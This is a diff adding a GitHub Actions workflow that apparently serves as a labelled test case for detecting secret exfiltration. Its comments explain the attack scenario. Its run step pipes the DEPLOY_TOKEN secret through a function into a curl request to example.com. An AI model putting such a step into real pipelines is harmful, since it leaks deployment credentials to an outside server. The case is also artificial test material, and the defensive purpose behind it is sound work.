@@ -1,0 +1,18 @@
+# situation: on push, a step defines a function f that prints the secret
+#   DEPLOY_TOKEN, and sends the output of f as the body of a request to
+#   https://example.com/.
+# reason: $(f) holds the token, and curl sends the token to example.com.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: the workflow sends the request as it always does, and
+#   the server, now the attacker's, logs the value of DEPLOY_TOKEN.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+        run: |
+          f() { echo "$DEPLOY_TOKEN"; }
+          curl -d "$(f)" https://example.com/
